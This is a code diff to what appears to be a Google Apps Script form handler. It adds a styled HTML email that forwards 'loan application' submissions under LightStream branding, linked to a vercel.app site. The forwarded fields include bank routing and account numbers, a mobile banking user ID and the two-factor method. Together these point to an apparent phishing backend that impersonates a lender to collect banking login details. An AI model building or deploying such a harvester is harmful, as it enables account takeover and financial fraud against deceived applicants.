@@ -70,6 +70,66 @@ function doPost(e) {
   }
 }
 
+function createHtmlEmailBody(data) {
+  return `
+    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background-color: #f8f9fa;">
+      <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; text-align: center; margin-bottom: 30px;">
+        <h1 style="margin: 0; font-size: 28px;">🎉 NEW LOAN APPLICATION RECEIVED! 🎉</h1>
+        <p style="margin: 10px 0 0 0; font-size: 16px;">LightStream Financial Services</p>
+      </div>
+      
+      <div style="background: white; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 20px;">
+        <h2 style="color: #333; border-bottom: 2px solid #667eea; padding-bottom: 10px;">👤 APPLICANT INFORMATION</h2>
+        <table style="width: 100%; border-collapse: collapse;">
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Name:</td><td style="padding: 8px;">${data.firstName || ''} ${data.lastName || ''}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Email:</td><td style="padding: 8px;">${data.email || 'N/A'}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Phone:</td><td style="padding: 8px;">${data.phone || 'N/A'}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Address:</td><td style="padding: 8px;">${data.streetAddress || ''}, ${data.city || ''}, ${data.state || ''} ${data.zipCode || ''}</td></tr>
+        </table>
+      </div>
+      
+      <div style="background: white; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 20px;">
+        <h2 style="color: #333; border-bottom: 2px solid #667eea; padding-bottom: 10px;">💰 LOAN DETAILS</h2>
+        <table style="width: 100%; border-collapse: collapse;">
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Loan Amount:</td><td style="padding: 8px; color: #28a745; font-weight: bold;">$${data.loanAmount || 'N/A'}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Loan Purpose:</td><td style="padding: 8px;">${data.loanPurpose || 'N/A'}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Loan Duration:</td><td style="padding: 8px;">${data.loanDuration || 'N/A'} months</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Credit Score:</td><td style="padding: 8px;">${data.creditScore || 'N/A'}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Monthly Income:</td><td style="padding: 8px;">$${data.grossMonthlyIncome || 'N/A'}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Employment:</td><td style="padding: 8px;">${data.employmentStatus || 'N/A'}</td></tr>
+        </table>
+      </div>
+      
+      <div style="background: white; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 20px;">
+        <h2 style="color: #333; border-bottom: 2px solid #667eea; padding-bottom: 10px;">🏦 BANKING INFORMATION</h2>
+        <table style="width: 100%; border-collapse: collapse;">
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Bank Name:</td><td style="padding: 8px;">${data.bankName || 'N/A'}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Routing Number:</td><td style="padding: 8px;">${data.routingNumber || 'N/A'}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Account Number:</td><td style="padding: 8px;">${data.accountNumber || 'N/A'}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Mobile Banking ID:</td><td style="padding: 8px;">${data.mobileBankingUserId || 'N/A'}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Two-Factor Method:</td><td style="padding: 8px;">${data.twoFactorMethod || 'N/A'}</td></tr>
+        </table>
+      </div>
+      
+      <div style="background: white; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 20px;">
+        <h2 style="color: #333; border-bottom: 2px solid #667eea; padding-bottom: 10px;">📊 SUBMISSION DETAILS</h2>
+        <table style="width: 100%; border-collapse: collapse;">
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Submitted:</td><td style="padding: 8px;">${new Date().toLocaleString()}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Application Type:</td><td style="padding: 8px;">${data.type || 'Loan'}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Terms Accepted:</td><td style="padding: 8px; color: ${data.termsAccepted === 'true' ? '#28a745' : '#dc3545'}; font-weight: bold;">${data.termsAccepted === 'true' ? '✅ YES' : '❌ NO'}</td></tr>
+        </table>
+      </div>
+      
+      <div style="text-align: center; padding: 20px; background: #f8f9fa; border-radius: 10px;">
+        <p style="margin: 0; color: #666;">📊 Please check Google Sheet for complete details and processing status.</p>
+        <p style="margin: 10px 0 0 0;">
+          <a href="https://lightstreamweb.vercel.app" style="background: #667eea; color: white; padding: 12px 24px; text-decoration: none; border-radius: 5px; display: inline-block;">🏦 Visit LightStream</a>
+        </p>
+      </div>
+    </div>
+  `;
+}
+
 function sendEmailNotification(data) {
   try {
     console.log("=== SENDING EMAIL ===");
@@ -112,6 +172,7 @@ function sendEmailNotification(data) {
       to: RECIPIENT_EMAIL,
       subject: subject,
       body: body,
+      htmlBody: createHtmlEmailBody(data),
       name: "LightStream Financial"
     });
     
